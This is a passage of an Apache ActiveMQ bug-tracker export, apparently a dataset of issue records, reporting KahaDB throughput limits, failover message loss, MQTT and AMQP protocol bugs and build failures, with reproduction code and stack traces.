We have publishers publishing to a topic which has 5 topic -> queue routings, and gets a max message rate attainable of ~833 messages/sec, with each message around 5k in size.To test this i set up a JMS config with topic queues:TopicTopicRouted.1...TopicRouted.11Each topic has an increasing number of routings to queues, and a client is set up to subscribe to all the queues.Rough message rates:routings messages/sec0 25001 14282 20003 14284 11115 833This occurs whether the broker config has producerFlowControl="false" set to true or false , and KahaDB disk synching is turned off. We also tried experimenting with concurrentStoreAndDispatch, but that didn"t seem to help. LevelDB didn"t give any notable performance improvement either.We also have asyncSend enabled on the producer, and have a requirement to use persistent messages. We have also experimented with sending messages in a transaction, but that hasn"t really helped.It seems like producer throughput rate across all queue destinations, all connections and all publisher machines is limited by something on the broker, through a mechanism which is not producer flow control. I think the prime suspect is still contention on the index.We did some test with Yourkit profiler.Profiler was attached to broker at startup, allowed to run and then a topic publisher was started, routing to 5 queues. Profiler statistics were reset, the publisher allowed to run for 60 seconds, and then profiling snapshot was taken. During that time, ~9600 messages were logged as being sent for a rate of ~160/sec.This ties in roughly with the invocation counts recorded in the snapshot (i think) - ~43k calls. From what i can work out, in the snapshot (filtering everything but org.apache.activemq.store.kahadb), For the 60 second sample period, 24.8 seconds elapsed in org.apache.activemq.store.kahadb.KahaDbTransactionStore$1.removeAsyncMessage(ConnectionContext, MessageAck).18.3 seconds elapsed in org.apache.activemq.store.kahadb.KahaDbTransactionStore$1.asyncAddQueueMessage(ConnectionContext, Message, boolean).From these, a further large portion of the time is spent inside MessageDatabase:org.apache.activemq.store.kahadb.MessageDatabase.process(KahaRemoveMessageCommand, Location) - 10 secs elapsedorg.apache.activemq.store.kahadb.MessageDatabase.process(KahaAddMessageCommand, Location) - 8.5 secs elapsed.As both of these lock on indexLock.writeLock(), and both take place on the NIO transport threads, i think this accounts for at least some of the message throughput limits. As messages are added and removed from the index one by one, regardless of sync type settings, this adds a fair amount of overhead. While we"re not synchronising on writes to disk, we are performing work on the NIO worker thread which can block on locks, and could account for the behaviour we"ve seen client side. To Reproduce:1. Install a broker and use the attached configuration.2. Use the 5.8.0 example ant script to consume from the queues, TopicQueueRouted.1 - 5. eg:   ant consumer -Durl=tcp://localhost:61616 -Dsubject=TopicQueueRouted.1 -Duser=admin -Dpassword=admin -Dmax=-13. Use the modified version of 5.8.0 example ant script (attached) to send messages to topics, TopicRouted.1 - 5, eg:   ant producer -Durl="tcp://localhost:61616?jms.useAsyncSend=true&wireFormat.tightEncodingEnabled=false&keepAlive=true&wireFormat.maxInactivityDuration=60000&socketBufferSize=32768" -Dsubject=TopicRouted.1 -Duser=admin -Dpassword=admin -Dmax=1 -Dtopic=true -DsleepTime=0 -Dmax=10000 -DmessageSize=5000This modified version of the script prints the number of messages per second and prints it to the console.
issueID:AMQ-5078
type:Improvement
changed files:ProtocolConverter.java
texts:Typos in stomp/ProtocolConverter.java
There are two typos in activemq-stomp/src/main/java/org/apache/activemq/transport/stomp/ProtocolConverter.java that are polluting my logs. I attach a patch to fix them.
issueID:AMQ-5080
type:Bug
changed files:TransactionContext.java
texts:RAR - missing messages on master slave failover
With repeated failover between master and slave and mdb that consumers from A and sends to B in a transaction we can -a) loose some messages acked as duplicates in errorb) duplicate some messages when acks are lost in error but don"t force a rollback.A long running test that consumers/produces 20k messages with a failover every 200 messages eventually shows up various problems. With XA recovery and async completion - there are many code path variations.
issueID:AMQ-5082
type:Bug
changed files:
texts:ActiveMQ replicatedLevelDB cluster breaks, all nodes stop listening
I have a 3 node amq cluster and one zookeeper node using a replicatedLevelDB persistence adapter.        <persistenceAdapter>            <replicatedLevelDB              directory="${activemq.data}/leveldb"              replicas="3"              bind="tcp://0.0.0.0:0"              zkAddress="zookeep0:2181"              zkPath="/activemq/leveldb-stores"/>        </persistenceAdapter>After about a day or so of sitting idle there are cascading failures and the cluster completely stops listening all together.I can reproduce this consistently on 5.9 and the latest 5.10 (commit 2360fb859694bacac1e48092e53a56b388e1d2f0).  I am going to attach logs from the three mq nodes and the zookeeper logs that reflect the time where the cluster starts having issues.The cluster stops listening Mar 4, 2014 4:56:50 AM (within 5 seconds).The OSs are all centos 5.9 on one esx server, so I doubt networking is an issue.If you need more data it should be pretty easy to get whatever is needed since it is consistently reproducible.This bug may be related to AMQ-5026, but looks different enough to file a separate issue.
issueID:AMQ-5086
type:Bug
changed files:BrokerService.java
texts:vm transport create=false&waitForStart race condition
Experience this bug on 5.7.0, I think this is the same on the trunkusing vm transport for a client to connect to an embedded broker, in a multithreaded application, I"m experiencing a an error (sometimes) which appears to be a race condition at startup.Im using create=false and waitForStart to create a connectionFactory for a client connectionvm://ApplicationName?create=false&waitForStart=120000The broker service is started in a seperate threadthe client connection is started first. but surprisingly it tries start the brokers transport connector. An apparent glitch follows when the broker service stops and re-start the transport.2014-03-05 11:07:57,626 [ClientConnection_thread] INFO  org.apache.activemq.broker.TransportConnector - Connector vm://ApplicationName Started[...]2014-03-05 11:08:07,009 [Main_thread] INFO  org.apache.activemq.broker.TransportConnector - Connector vm://ApplicationName Stopped2014-03-05 11:08:07,011 [Main_thread] INFO  org.apache.activemq.broker.TransportConnector - Connector vm://ApplicationName StartedI look into the activemq source and saw this:BrokerService.classpublic void start() throws Exception {[...]    // in jvm master slave, lets not publish over existing broker till we get the lock    final BrokerRegistry brokerRegistry = BrokerRegistry.getInstance();    if (brokerRegistry.lookup(getBrokerName()) == null) {            brokerRegistry.bind(getBrokerName(), BrokerService.this);    }    startPersistenceAdapter(startAsync);    startBroker(startAsync);    brokerRegistry.bind(getBrokerName(), BrokerService.this);VMTransportFactory.class    private BrokerService lookupBroker(final BrokerRegistry registry, final String brokerName, int waitForStart) {        BrokerService broker = null;        synchronized(registry.getRegistryMutext()) {            broker = registry.lookup(brokerName);            if (broker == null && waitForStart > 0) {                final long expiry = System.currentTimeMillis() + waitForStart;                while (broker == null  && expiry > System.currentTimeMillis()) {                    long timeout = Math.max(0, expiry - System.currentTimeMillis());                    try {                        LOG.debug("waiting for broker named: " + brokerName + " to start");                        registry.getRegistryMutext().wait(timeout);                    } catch (InterruptedException ignored) {                    }                    broker = registry.lookup(brokerName);                }            }        }        return broker;    }It appears that create=false and waitForStart only waits for the broker to be added to the BrokerRegistry. However when the brokerService is starts, it seems that the broker is added to the registry before it is started.I believe some synchronization is missing make the VMTransportFactory wait for the broker not only to be added to the registry, but also fully started.
issueID:AMQ-5087
type:Bug
changed files:
texts:RedeliveryPolicy redeliveryDelay is ignored if initialRedeliveryDelay is specified
If we specify RedeliveryPolicy initialRedeliveryDelay and no exponent the value is used for every redelivery attempt, not just the first.
issueID:AMQ-5089
type:Bug
changed files:
texts:Inflight Count for topics is not correct
Hi,It is coming from: http://activemq.2283324.n4.nabble.com/Inflight-Count-for-topics-not-correct-td4678407.html#a4678583Problem:  Inflight count is not going down for topics once consumer is disconnected or sent acknowledgements for the messages it has received.For topics once inflight count is increased, it is never going back down. Test Scenario: When a producer and a consumer connected to the broker but consumer is little bit slow, there will be inflight messages in the broker which are not yet acknowledged. Case 1 :Now after some time when consumer acknowledged the messages, than inflight count should decrease, but that is not happening for topics.Case 2 :Now If at this point of time, I stop consumer broker should make inflight count to "0" because those messages are not inflight now. (for queue these are now held messages and for topic those messages are dropped). But when I check in Jconsole, I found that: for a queue it is working fine and going down to 0 but for topics inflight count is not changing.Test Case: I tested with normal java consumer subscribing to a topic, I put thread.sleep(5000) while receiving messages. Now consumer will take time to acknowledge messages which are received. So that we can see inflight messages. Now after 5 seconds, consumer has received the messages and also sent acknowledgement to the broker but inflight count is not decreasing. Now if I disconnects consumer inflight count should go down to "0", again here also it is not changing for that topic.Thanks,Anuj
issueID:AMQ-5090
type:Bug
changed files:ConnectionStateTracker.java
FailoverTransport.java
texts:Improve Failover transport transaction tracking
If corrupted TransactionInfo (with transactionId=null) comes to FailoverTransport.oneway() it can lead to eternal reconnect loop as tracking of the command will fail. We need to check transactionId and not trigger reconnect if tracking fails.
issueID:AMQ-5091
type:Improvement
changed files:
texts:Upgrade to jolokia 1.2
Jolokia 1.2.0 has been released.
issueID:AMQ-5092
type:Bug
changed files:
texts:MQTT uses duplicate packet IDs for PUBLISH messages
MQTT protocol converters does not correctly generate unique packet ids for retained and non-retained publish messages sent to clients. MQTT requires that all Publish messages with QoS > 0 must have a unique packet id which can be used by clients to coordinate the PUBACK, PUBREC, PUBREL and PUBCOMP messages depending upon the QoS flow. Although retained messages published on creation of client subscriptions are copies of retained messages, they must carry a unique packet id when dispatched to clients. ActiveMQ re-uses the retained message"s packet id, which makes it difficult to acknowledge these messages when wildcard topics are used. ActiveMQ also sends the same non-retained message multiple times for every matching subscription for overlapping subscriptions. These messages also re-use the publisher"s message id as the packet id, which breaks client acknowledgment. A patch is included, which fixes all the above scenarios. It generates a unique packet id for every publish (retained and non-retained), and also ensures that redelivery on the same connection will re-use message ids, with the dup flag set. The patch also maps JMS redelivery status for a subscription to the MQTT Dup flag to indicate duplicate messages. Unit tests are included to test correct packet id generation.
issueID:AMQ-5093
type:Bug
changed files:
texts:ampq with nio or nio+ssl fails when sending large messages
This can be reproduced with the test case shown below, which I will add to JMSClientTest.public void testSendLargeMessage() throws JMSException, InterruptedException {        Connection connection = createConnection();        Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);        String queueName = name.toString();        Queue queue = session.createQueue(queueName);        MessageProducer producer=session.createProducer(queue);        int messageSize = 1024 * 1024;        String messageText = createLargeString(messageSize);        Message m=session.createTextMessage(messageText);        LOG.debug("Sending message of {} bytes on queue {}", messageSize, queueName);        producer.send(m);        MessageConsumer  consumer=session.createConsumer(queue);        Message message = consumer.receive();        assertNotNull(message);        assertTrue(message instanceof TextMessage);        TextMessage textMessage = (TextMessage) message;        LOG.debug(">>>> Received message of length {}", textMessage.getText().length());        assertEquals(messageSize, textMessage.getText().length());        assertEquals(messageText, textMessage.getText());    }
issueID:AMQ-5096
type:Bug
changed files:AmqpProtocolConverter.java
texts:AMQP Protocol doesn&#39;t send back meaningfull errors for unauthroized access
When creating a producer or consumer with invalid credentials the AMQP protocol converter doesn"t send back a meaningful error condition.  We should return UNAUTHORIZED_ACCESS instead of INERNAL_ERROR.
issueID:AMQ-5099
type:Bug
changed files:OpenWireFormat.java
texts:Useless or dead code in OpenWireFormat class.
Method marshal has following code:        ByteSequence sequence = null;        // if( ma!=null ) {        // sequence = ma.getCachedMarshalledForm(this);        // }        if (sequence == null) {       ....It makes no sense to check if sequence is null because it is set to null couple of lines above and possible value change is commented. It would be better to comment the check or remove both check and commented lines.
issueID:AMQ-5101
type:Bug
changed files:
texts:MQTT SUBACK packet MUST use return code 0x80 to report failed topic subscriptions
MQTT 3.1.1 spec requires that failed topic subscriptions in a SUBACK packet MUST have a return code of 0x80 instead of the requested QoS. A patch is included to add this behavior.
issueID:AMQ-5102
type:Bug
changed files:
texts:AMQ4914Test.testSendHugeMessage times out on CI boxes
This test fails intermittently with the error below.  This is a pretty marginal case; it never fails on my laptop, and it doesn"t fail on CI boxes when run on its own, only when all tests are run.testSendHugeMessage(org.apache.activemq.transport.amqp.bugs.AMQ4914Test)  Time elapsed: 303.375 sec  <<< ERROR!java.lang.Exception: test timed out after 300000 milliseconds at java.lang.Object.wait(Native Method) at java.lang.Object.wait(Object.java:485) at org.apache.qpid.amqp_1_0.client.Receiver.receiveFromPrefetch(Receiver.java:328) at org.apache.qpid.amqp_1_0.client.Receiver.receive(Receiver.java:258) at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive0(MessageConsumerImpl.java:291) at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receiveImpl(MessageConsumerImpl.java:260) at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive(MessageConsumerImpl.java:235) at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive(MessageConsumerImpl.java:57) at org.apache.activemq.transport.amqp.bugs.AMQ4914Test.doTestSendLargeMessage(AMQ4914Test.java:104) at org.apache.activemq.transport.amqp.bugs.AMQ4914Test.testSendHugeMessage(AMQ4914Test.java:80)
issueID:AMQ-5104
type:Bug
changed files:
texts:Show non-durable Topic subscriptions on the web console
Displaying non-durable Topic subscriptions on the web console will complete access to consumer details on the webconsole.
issueID:AMQ-5105
type:Bug
changed files:
texts:leveldb fails to startup because of NoSuchMethodError
leveldb persistence fails to start due to errors as given below  Caused by: java.lang.NoSuchMethodError: com.google.common.base.Objects.firstNonNull(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;        at com.google.common.cache.CacheBuilder.getKeyStrength(CacheBuilder.java:530)        at com.google.common.cache.LocalCache.<init>(LocalCache.java:238)        at com.google.common.cache.LocalCache$LocalLoadingCache.<init>(LocalCache.java:4861)        at com.google.common.cache.CacheBuilder.build(CacheBuilder.java:803)        at org.iq80.leveldb.impl.TableCache.<init>(TableCache.java:46)        at org.iq80.leveldb.impl.DbImpl.<init>(DbImpl.java:155)        at org.iq80.leveldb.impl.Iq80DBFactory.open(Iq80DBFactory.java:59)        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$replay_init$2.apply$mcV$sp(LevelDBClient.scala:661)        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$replay_init$2.apply(LevelDBClient.scala:657)        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$replay_init$2.apply(LevelDBClient.scala:657)        at org.apache.activemq.leveldb.LevelDBClient.might_fail(LevelDBClient.scala:549)The problem seems to be because of multiple jars having the same classesguava-12.jarpax-url-aether-1.5.2.jarThe class present in pax-url-aether-1.5.2.jar gets loaded causing level db to fail.
issueID:AMQ-5106
type:Bug
changed files:
texts:unable to build trunk from scratch due to missing dependency
Hi I"m not able to complete the mvn eclipse:clean eclise:eclipse on the trunk due to a missing jar.org.apache.xerces:xercesImpl:jar:2.11.0could not be located over default repository (and I"ve no local copy).Please add some repository or deploy it over officials repo.Here is the stack trace:org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal on project activemq-karaf-itest: Could not resolve dependencies for project org.apache.activemq:activemq-karaf-itest:jar:5.10-SNAPSHOT: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)        at org.apache.maven.lifecycle.internal.LifecycleDependencyResolver.getDependencies(LifecycleDependencyResolver.java:220)        at org.apache.maven.lifecycle.internal.LifecycleDependencyResolver.resolveProjectDependencies(LifecycleDependencyResolver.java:127)        at org.apache.maven.lifecycle.internal.MojoExecutor.ensureDependenciesAreResolved(MojoExecutor.java:257)        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:200)        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)        at org.apache.maven.lifecycle.internal.MojoExecutor.executeForkedExecutions(MojoExecutor.java:364)        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:198)        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:84)        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:59)        at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBuild(LifecycleStarter.java:183)        at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:161)        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:318)        at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:153)        at org.apache.maven.cli.MavenCli.execute(MavenCli.java:555)        at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:214)        at org.apache.maven.cli.MavenCli.main(MavenCli.java:158)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:597)        at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)        at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)        at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:414)        at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:357)Caused by: org.apache.maven.project.DependencyResolutionException: Could not resolve dependencies for project org.apache.activemq:activemq-karaf-itest:jar:5.10-SNAPSHOT: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)        at org.apache.maven.project.DefaultProjectDependenciesResolver.resolve(DefaultProjectDependenciesResolver.java:198)        at org.apache.maven.lifecycle.internal.LifecycleDependencyResolver.getDependencies(LifecycleDependencyResolver.java:195)        ... 26 moreCaused by: org.eclipse.aether.resolution.DependencyResolutionException: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)        at org.eclipse.aether.internal.impl.DefaultRepositorySystem.resolveDependencies(DefaultRepositorySystem.java:384)        at org.apache.maven.project.DefaultProjectDependenciesResolver.resolve(DefaultProjectDependenciesResolver.java:192)        ... 27 moreCaused by: org.eclipse.aether.resolution.ArtifactResolutionException: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)        at org.eclipse.aether.internal.impl.DefaultArtifactResolver.resolve(DefaultArtifactResolver.java:459)        at org.eclipse.aether.internal.impl.DefaultArtifactResolver.resolveArtifacts(DefaultArtifactResolver.java:262)        at org.eclipse.aether.internal.impl.DefaultRepositorySystem.resolveDependencies(DefaultRepositorySystem.java:367)        ... 28 moreCaused by: org.eclipse.aether.transfer.ArtifactNotFoundException: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)        at org.eclipse.aether.connector.wagon.WagonRepositoryConnector$6.wrap(WagonRepositoryConnector.java:1012)        at org.eclipse.aether.connector.wagon.WagonRepositoryConnector$6.wrap(WagonRepositoryConnector.java:1004)        at org.eclipse.aether.connector.wagon.WagonRepositoryConnector$GetTask.run(WagonRepositoryConnector.java:725)        at org.eclipse.aether.util.concurrency.RunnableErrorForwarder$1.run(RunnableErrorForwarder.java:67)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)        at java.lang.Thread.run(Thread.java:662)&#91;ERROR&#93; &#91;ERROR&#93; Re-run Maven using the -X switch to enable full debug logging.&#91;ERROR&#93; &#91;ERROR&#93; For more information about the errors and possible solutions, please read the following articles:&#91;ERROR&#93; &#91;Help 1&#93; http://cwiki.apache.org/confluence/display/MAVEN/DependencyResolutionException&#91;ERROR&#93; &#91;ERROR&#93; After correcting the problems, you can resume the build with the command&#91;ERROR&#93;   mvn <goals> -rf :activemq-karaf-itest
issueID:AMQ-5107
type:Bug
changed files:
texts:In-flight queue message redelivered to multiple listeners upon broker shutdown
To reproduce: 1) Start 3 or more listener processes (see listener code below)2) Run producer to push one message on queue (see producer code below)3) One of the listeners will pick-up the message and sleep for one minute before auto acknowledging the message4) Start a shutdown sequence of the broker within the 60 second window (Ctrl-C or issue Terminate jvm(int) command from Hawtio console) 5) All other idle listeners should get the same message redelivered simultaneously, each one having deliveryCount incremented Listener code:--------------package com.test;import javax.jms.Connection;import javax.jms.Destination;import javax.jms.Message;import javax.jms.MessageConsumer;import javax.jms.MessageListener;import javax.jms.Session;import javax.jms.TextMessage;import org.apache.activemq.ActiveMQConnectionFactory;public class TestListener { public static void main(String[] args) {  try {    ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory("tcp://localhost:61616");   Connection connection = connectionFactory.createConnection();   Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);   Destination destination = session.createQueue("TEST.QUEUE");   MessageConsumer consumer = session.createConsumer(destination);   consumer.setMessageListener(new MessageListener() {    public void onMessage(Message message) {     try {      TextMessage textMessage = (TextMessage) message;      System.out.print("
Received " + textMessage.getText());      System.out.print(", Redelivery: " + message.getJMSRedelivered());      System.out.print(", Count: " + message.getLongProperty("JMSXDeliveryCount"));      Thread.sleep(60000);         System.out.print("... finished after sleep");     } catch (Exception e) {      e.printStackTrace();     }    }   });   connection.start();  } catch (Exception e) {   e.printStackTrace();  } } public TestListener() {  super(); }}Producer code:--------------package com.test;import java.util.Date;import javax.jms.Connection;import javax.jms.Destination;import javax.jms.MessageProducer;import javax.jms.Session;import javax.jms.TextMessage;import org.apache.activemq.ActiveMQConnectionFactory;public class TestProducer { public static void main(String[] args) {  try {   thread(new HelloWorldProducer(), false);  } catch (Exception e) {   e.printStackTrace();  } } public static class HelloWorldProducer implements Runnable {  public void run() {   try {    ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory("tcp://localhost:61616");    Connection connection = connectionFactory.createConnection();    connection.start();    Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);    Destination destination = session.createQueue("TEST.QUEUE");    MessageProducer producer = session.createProducer(destination);    String text = "test message created on " + new Date();    TextMessage message = session.createTextMessage(text);    System.out.println("Sent " + text);    producer.send(message);    session.close();    connection.close();   }   catch (Exception e) {    e.printStackTrace();   }  }  public HelloWorldProducer() {} } public static void thread(Runnable runnable, boolean daemon) {  Thread brokerThread = new Thread(runnable);  brokerThread.setDaemon(daemon);  brokerThread.start(); } public TestProducer() {  super(); }}
issueID:AMQ-5108
type:Bug
changed files:
texts:MQTT subscriptions for cleansession=true MUST be non-durable
When MQTT cleansession flag is set to 1, the Broker MUST remove existing subscriptions for the provided client id as well as not leave any subscriptions created in that clean session around after the network connection is closed. ActiveMQ MUST therefore create non-durable subscriptions for cleansession=1 sessions. A patch is attached that adds this behavior, as well as fixes some small issues in MQTT tests. It also includes a fix to remove connection info when the connection is shutdown due to a transport error or exception.
issueID:AMQ-511
type:New Feature
changed files:TopicView.java
ManagedQueueRegion.java
ActiveMQMapMessage.java
OpenTypeSupport.java
ManagedTempQueueRegion.java
ManagedTopicRegion.java
QueueViewMBean.java
Queue.java
QueueView.java
ManagedTempTopicRegion.java
ManagedRegionBroker.java
TopicViewMBean.java
AbstractRegion.java
DestinationViewMBean.java
DestinationView.java
texts:add MBean methods to browse the messages on a queue, to purge a queue or delete a message
None
issueID:AMQ-5110
type:Bug
changed files:AmqpProtocolConverter.java
texts:No disposition set on Discharge response for AMQP TX commit or rollback
When an AMQP transaction is committed or rolled back the broker settles the delivery but does not set an Accepted outcome on the delivery.  The spec indicates that a proper discharge response will contain an accepted outcome along with being remotely settled.
issueID:AMQ-5112
type:Bug
changed files:
texts:MQTT server connections are not thread safe
MQTTProtocolConverter uses MQTTTransportFilter.sendToMQTT() to send packets to clients. However, there is a race condition where the converter is sending SUBACK or other acks to clients when ActiveMQ messages from the Broker also try to call sendToMQTT() to send PUBLISH packets to the same client. A patch is included which fixes this by synchronizing the call to the underlying transport buffer in MQTTTransportFilter.sendToMQTT(). This also resolves another issue AMQ-4712, where some tests would intermittently fail due to this race condition. Those tests were marked as ignored, so this patch enables them again.
issueID:AMQ-5113
type:Bug
changed files:
texts:JmsCronSchedulerTest fails intermittently because of race condition in test
testSimulatenousCron fails intermittently because of a race condition involving the order of updating countDownLatches in onMessage.
issueID:AMQ-5114
type:Improvement
changed files:
texts:AbortSlow*ConsumerStrategy with abortConnection=false; ensure consumers are always removed from the broker
If a consumer is slow and a candidate to abort, the broker sends a control command to the consumer. However there is no guarantee that the consumer will respond to the command and close. As a result the consumer can remain longer than necessary and possibly indefinitely.,The broker needs to follow up with a local removeInfo  that will force the removal from the broker so that inflight messages can get eagerly redispatched.The client can eventually shut down the client view of the consumer but the broker will be able to continue regardless.
issueID:AMQ-5115
type:Bug
changed files:
texts:LevelDB sync=true is not being honored.
None
issueID:AMQ-5116
type:Bug
changed files:DefaultJDBCAdapter.java
texts:batchStatment is misspelled for JDBC adaptors
batchStatment is misspelled for JDBC adaptors and causes confusion for setting the field.  It should have proper spelling as "batchStatement" - notice the e.Fix should provide backward compatibility, but mark it as deprecated.
issueID:AMQ-5119
type:Bug
changed files:
texts:broker redeliveryPlugin: after message redelivery, all subsequent "producer.send()" using same message are "scheduled" for delivery to queue rather than delivered to queue as normal
example: consumer on QueueA does a transaction.rollback message is being redelivered by the redeliveryPlugin to QueueA - as expected. When the message is consumed again the AMQ_SCHEDULED_DELAY property is still set the same message is subsequently sent to queueB the send() is intercepted by org.apache.activemq.broker.scheduler.SchedulerBroker and scheduled for delivery later - this is not expected
issueID:AMQ-5121
type:Bug
changed files:
texts:Browse command is no more working with Karaf
the activemq:browse command was working with ActiveMQ 5.8.0, but with ActiveMQ 5.9.0 the command is complaining about an unrecognized option "jmxlocal".an example :karaf@root> activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf TEST.FOOINFO: Unrecognized option: --jmxlocalTask Usage: Main browse --amqurl <broker url> [browse-options] <destinations>Description: Display selected destination"s messages.
issueID:AMQ-5122
type:Improvement
changed files:DiscoveryNetworkConnector.java
texts:Unnecessary log of Stacktrace within DiscoveryNetworkConnector
Setup: one embedded broker with a configured networkConnector: <networkConnectors>  <networkConnector name="linkToParentBroker"   uri="static:(tcp://127.0.0.1:61617)" /> </networkConnectors> a logLevel that shows at leat WARN messages no other broker available (i.e. nobody is listening on tcp://127.0.0.1:61617)I would expect to see a warning in the logfiles that indicates: "Hey, I"m not able to start the network bridge you configured". But instead it prints out the warning and a full stacktrace.2014-03-27_13:01:21.777 &#91;ActiveMQ Task-1&#93; WARN  o.a.a.network.DiscoveryNetworkConnector - Could not start network bridge between: vm://localhost?async=false&network=true and: tcp://127.0.0.1:61617 due to: {}java.net.ConnectException: Connection refused: connect at java.net.PlainSocketImpl.socketConnect(Native Method) ~&#91;na:1.6.0_25&#93; at java.net.PlainSocketImpl.doConnect(Unknown Source) ~&#91;na:1.6.0_25&#93; at java.net.PlainSocketImpl.connectToAddress(Unknown Source) ~&#91;na:1.6.0_25&#93; at java.net.PlainSocketImpl.connect(Unknown Source) ~&#91;na:1.6.0_25&#93; at java.net.SocksSocketImpl.connect(Unknown Source) ~&#91;na:1.6.0_25&#93; at java.net.Socket.connect(Unknown Source) ~&#91;na:1.6.0_25&#93; at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:496) ~&#91;activemq-all-5.9.0.jar:5.9.0&#93; at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:459) ~&#91;activemq-all-5.9.0.jar:5.9.0&#93; at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55) ~&#91;activemq-all-5.9.0.jar:5.9.0&#93; at org.apache.activemq.transport.AbstractInactivityMonitor.start(AbstractInactivityMonitor.java:138) ~&#91;activemq-all-5.9.0.jar:5.9.0&#93; at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58) ~&#91;activemq-all-5.9.0.jar:5.9.0&#93; at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72) ~&#91;activemq-all-5.9.0.jar:5.9.0&#93; at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58) ~&#91;activemq-all-5.9.0.jar:5.9.0&#93; at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58) ~&#91;activemq-all-5.9.0.jar:5.9.0&#93; at org.apache.activemq.network.DemandForwardingBridgeSupport.start(DemandForwardingBridgeSupport.java:204) ~&#91;activemq-all-5.9.0.jar:5.9.0&#93; at org.apache.activemq.network.DiscoveryNetworkConnector.onServiceAdd(DiscoveryNetworkConnector.java:152) ~&#91;bin/:5.9.0&#93; at org.apache.activemq.transport.discovery.simple.SimpleDiscoveryAgent$1.run(SimpleDiscoveryAgent.java:184) &#91;activemq-all-5.9.0.jar:5.9.0&#93; at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source) &#91;na:1.6.0_25&#93; at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) &#91;na:1.6.0_25&#93; at java.lang.Thread.run(Unknown Source) &#91;na:1.6.0_25&#93;Looking at the code (DiscoveryNetworkConnector.java) we can see that there are two logging statements. One Warning and one Debug:DiscoveryNetworkConnector.java                LOG.warn("Could not start network bridge between: {} and: {} due to: {}", new Object[]{ localURI, uri, e });                LOG.debug("Start failure exception: ", e);I think it would be sufficient if the warning logged only the message from the exception, but not the whole stacktrace.
issueID:AMQ-5123
type:New Feature
changed files:pom.xml
DecryptCommand.java
EncryptCommand.java
EncryptionSupport.java
ShellCommand.java
PrincipalProperties.java
texts:Optionally support encrypted passwords in ActiveMQ users.properties file.
This is going to require an enhancement of the JAAS PropertiesLoginModule
issueID:AMQ-5124
type:Bug
changed files:
texts:Exception logged on startup: jolokia-agent: Cannot start discovery multicast handler
